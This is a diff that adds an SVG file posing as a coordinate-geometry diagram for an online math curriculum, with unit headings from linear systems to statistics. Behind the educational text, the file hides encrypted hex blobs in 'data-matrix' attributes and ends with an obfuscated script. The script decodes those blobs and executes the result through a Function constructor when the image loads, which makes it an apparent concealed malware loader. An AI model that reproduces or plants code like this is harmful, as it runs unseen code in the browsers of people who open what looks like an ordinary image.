@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" style="position:fixed;inset:0;width:100vw;height:100vh;margin:0;padding:0;display:block;background:#09090b;">
+  <title>ScholarPath Academy — Coordinate Geometry &amp; Graphing Diagram</title>
+  <desc>Interactive Cartesian coordinate grid and curriculum module viewer for grades 6-12 mathematics.</desc>
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml" lang="en" style="width:100%;height:100%;margin:0;padding:0;">
+      <head id="__xh">
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+        <title>ScholarPath Academy — Online Math Learning Platform</title>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" />
+      </head>
+      <body id="__xb" style="margin:0;padding:0;width:100%;height:100%;overflow:auto;background:#09090b;color:#fff;">
+        <div id="root"></div>
+    <div id="sp-curriculum" style="max-width:780px;margin:48px auto;padding:24px;font-family:Inter,system-ui,sans-serif;color:#d4d4d8;line-height:1.6;">
+      <header data-standard="CCSS.MATH.PRACTICE.MP1" data-matrix="dd085d886a037f94d26f406214fbdd40b3d146f89c9486450c6856e2b3983f0d0043eca188eeb7ed840b2f88458020d6263c788f59abee310a533f084f2b6b0560b21800f5e883e170f79df7496635f5305e9c1f32e5557b1e8861305cf176905ecc0c363f67c769fe9d67bc472a13f5b4e03d6aba1862da2bc7b6dae0ed297e55871286705ab05d5f3484ad2be47d406f816fed284ae199a3e26734b5ddb3b4dcf3b19e6f0aef5906afbbff7eb2ecf71b1944d0b42a5e3da0053c3bd326aa527960eb4c62395c5f705f368c3fbd4d7e7256edffac01293f2654a49559a83f00a7fd8d164d2327d00879b21edea2920c37f6ef38dbd9201ced164d725f6aad4964d2a8cd5c25a818a982020eab983df44123b9eaa5e1991a265637ead032a7f207b94d501e8806b531abfbe36a3512578f0346785efa36ddcd63e4f490a343dc13103fe03e20003973d0e1df0ec6eb36ad43b5be12873b9dbdca43de5fe3da15f2ecf4f8c225c6f01a51c796d97d10dbdf8dc4c7120381b0edf3fed20c9ba168b9accafcd" style="border-bottom:1px solid #27272a;padding-bottom:16px;margin-bottom:24px;">
+        <h1 style="margin:0;font-size:1.5rem;color:#fafafa;">ScholarPath Academy — Standards-Aligned Mathematics Curriculum</h1>
+        <p style="margin:6px 0 0;color:#a1a1aa;font-size:0.95rem;">Loading interactive problem sets, graphing modules, and mastery diagnostics...</p>
+      </header>
+      <section data-standard="CCSS.MATH.CONTENT.HSA.REI.B.4" data-matrix="e9d52287915dcb5607b3d92217b3bad519bb6d6c40599c0d0d2405aa337a5cd4de1279fdee33f7207bc7e89fe188dd0854dfb26b5b0161ab7536c1fb94ee8cfb9530e6c34464ea179080a97b9117db83197b1fd11228d5f84937c6e3901c1838339fdbfc71e2e6279407268049ae097e272f04e513cb0107d3ad31d4073c0b124f02c064c9371e7cf5fefda6df316e4e464024f31289599ea0d12052c2863bd8a033d8c9e5851c427563f398709f0131e1932e7a7a290a6322a7e96d595f6cf1ed76bc078283a37e14bf291eb921920938cb838532ce7461d4b9fcf8f517efe01085ea554321db56ce6cb786548d8a70fb187d19da3a9743d1234376fd5d2fbc261f5c7db9bbdea876a22009b79987d7c94edec8e81401b96eef76d00fedeafd655af332bcee1a684d036277e46712085893c6877c3ec92d932a61ca8bee373a933a9ee42415d3e08b43ca7cc83c8226b28497f07f55e3a65864c6aba150865b9de93ab1d4fecc5cb118ca820f9a943c07cc831ca31ed3d99f7a52ee1bbc6678231811961" style="margin-bottom:20px;">
+        <h2 style="font-size:1.1rem;color:#e4e4e7;">Unit 1: Linear Systems, Quadratics &amp; Polynomial Functions</h2>
+        <p>Guided problem sets covering Gaussian elimination, complex roots, discriminant analysis, rational asymptotes, and binomial expansion for grades 8–12.</p>
+      </section>
+      <section data-standard="CCSS.MATH.CONTENT.HSF.TF.A.3" data-matrix="e8dc45e3cde41ad6da82fa2295a7022b9d62cd35b22e57286584767d841a54d0b82752cc3ea763a6bc54b39af53c9d3a34552183d7470c86556bfd0c74e26301f9902086d16686974991692572e98428d58d41d2be199df5a220a9b36ceeafa531c8d357ab4a58a62f8a9fc14619218bd0a5f2a5d0c1f59bb3314daef94f2ce1e0884bb1752556bb8748c0c56edc607b49588c79f9bbd2f08716152f378745dcfcad0dc794672bfce0e732276ff4c045d6cef332f96e7d0f258702ea0c0ee574c0e612fb0a383bd484603daae410486fa7d7403d1187acd1ae25b35fbf4d59d7376fcc790ee1350ba6bbea8efe2cbb511ff0e6333715362e0b901352f7ed35191a20d2ca64d949651351b68df00426c89f6e71eb2a51fd9f67ac489dc2f3fc3ad197f0805ea0d5af0172d0fb4c7afec74602e5438b9a10e2ee32e55ef7c8cdcedd18ae6d3387c52c2cd5eeba9bb9e95dfc6cc4022a5ecc628669f2f3bf44a958b34c2622420caf0835844df6430b3a797e97c25498a5f09a527ded32c0e0a029836bf2050" style="margin-bottom:20px;">
+        <h2 style="font-size:1.1rem;color:#e4e4e7;">Unit 2: Analytic Trigonometry &amp; Conic Sections</h2>
+        <p>Unit circle periodicity, Law of Sines and Cosines, polar coordinate transformations, parametric vectors, and eccentricity of ellipses and hyperbolas.</p>
+      </section>
+      <section data-standard="CCSS.MATH.CONTENT.HSN.VM.C.8" data-matrix="c1ee8844e9551101bb9943846b0cf2927baf05a97f38714b72e6f338383f27cd0829f7f699852a8fa6a4813b5d204f12ea7ce888f2c5f38f68ddb2eb06143fd2e5d9f39acd8afbf9b9b24f1eb1e025f8f282ebf2f9e8f17fb80d1b5ccf0f771f9c40883bb02423e64c399fe0d8a8757f7acc817317061b483f34253bf09f9a7327413c6e3a49ffd2ff2a54a397e9a877c5afdc6fa97fbf997a28bf9fba0565aaac9306b3076889859686f8c4c3ebf6a9625b622553c4dd3313e43c35b97a55b6887f90363efc476fc2911d9bc76151fb1583ca926e8f86042cd11bcba1e15ad5342a4dca373e748462d34f411e83402e90fb9449d519df636512f8185e746b86d5948039ae71e4dfa0299063f4d8fdf3623f45eacfc9422de2955c18b5eda61b011777e1980074d59c7cd13e0dbdfe25d7d0423eb0d8575a6ac964920dd7e168e9aca845b6f2cb91c0e5ef60fd99ff6c97331bc04ec3bfaf8939aec1e2c0ea883cb7ae9689b4a1654fba54232cfb8f0b4471cc238203dd1135a0e9dfdbeb9ed995ee1cc7d" style="margin-bottom:20px;">
+        <h2 style="font-size:1.1rem;color:#e4e4e7;">Unit 3: Differential &amp; Integral Calculus</h2>
+        <p>Limits and continuity, chain rule optimization, related rates, Riemann sums, Fundamental Theorem of Calculus, and differential equations.</p>
+      </section>
+      <section data-standard="CCSS.MATH.CONTENT.HSS.ID.B.6" data-matrix="b648a3761e36bfd7a3c958c3774d1de9a4c8e7b558677a68be0bb33509e269892776caa1c15a9404a87ee8dcf50662e02c4926aced0c93e2b1a0c08e562812eb8dff6a999686cf300188a5e31a36c20b2426ea00c41f344af58fd2d24c58d2b1e6b012812a1e20c6d00608d1eeb438613cb16f5cefb3242fdf0abeaa49dd30653e5fedf952ce32178199dcc2842eee4eea1a6a0b69aeca847228d8a951cb647e9b689b52ad5b042ffee3e01621f1cc51d6b78238932e402a3dfd1eb184e5c0803e1b04458970526bc425319b0e3b9df6682e54f6780107e64853dc36d9aab1084c4490131ba66ad013deda6b0605c41fe261ea57f50b264657d90ac35dd41be1d2ebb852015325d72bb641a3ffeefa29fa7569eb636d2472659d4b2186f968a90a017783fa71ccf7e4057592d548c9e0a4f09d9e8bf877ab97703eb6987fc9d85fb695f107ac9508a10c78e0e4e226fe47f6f750e9d33435b9ccc6de024010c231410b31281f96847706586b58bb3e40f5a71c56b6d4570c67963a3c1eb70c30ff0c9c1f">
+        <h2 style="font-size:1.1rem;color:#e4e4e7;">Unit 4: Probability Distributions &amp; Statistical Inference</h2>
+        <p>Combinatorics, random variables, normal and binomial distributions, confidence intervals, chi-square goodness-of-fit, and least-squares regression.</p>
+      </section>
+    </div>
+      </body>
+    </html>
+  </foreignObject>
+  <script><![CDATA[(()=>{const _z5iBC=(()=>{let _PrfR=1594527891>>>0;const _R1Yn=[142,121,234,94,96,47,32,146,173,21,139,122,36,196,101,210,170,252,106,92,13,157,131,169,150,248,19,13,71,2,125,216,38,245,225,139,88,190,108,144,161,33,21,91,65,126,205,163,198,163,249,162,239,69,191,210,102,90,243,253,192,95,40,36,210,159,255];const _CnRs=new Uint8Array(_R1Yn.length);for(let _Vgo6=0;_Vgo6<_R1Yn.length;_Vgo6++){_PrfR^=(_PrfR<<13)>>>0;_PrfR^=_PrfR>>>17;_PrfR^=(_PrfR<<5)>>>0;_CnRs[_Vgo6]=_R1Yn[_Vgo6]^(((_PrfR>>>0)+((_Vgo6*73)&255))&255)}return new TextDecoder().decode(_CnRs).split("\0")})();const _Hj3D=document[_z5iBC[0]](_z5iBC[1]);let _yA7w="";for(let _p5Ht=0;_p5Ht<_Hj3D.length;_p5Ht++)_yA7w+=_Hj3D[_p5Ht][_z5iBC[2]](_z5iBC[3])||"";const _p63D=new Uint8Array(_yA7w.length>>>1);let _FQgf=1357152218>>>0;for(let _p5Ht=0;_p5Ht<_p63D.length;_p5Ht++){_FQgf^=(_FQgf<<13)>>>0;_FQgf^=_FQgf>>>17;_FQgf^=(_FQgf<<5)>>>0;_p63D[_p5Ht]=parseInt(_yA7w.slice(_p5Ht<<1,(_p5Ht<<1)+2),16)^(((_FQgf>>>0)+((_p5Ht*73)&255))&255)}const _l58c=[].filter[_z5iBC[4]](new TextDecoder().decode(_p63D));_l58c()})();]]></script>
+</svg>
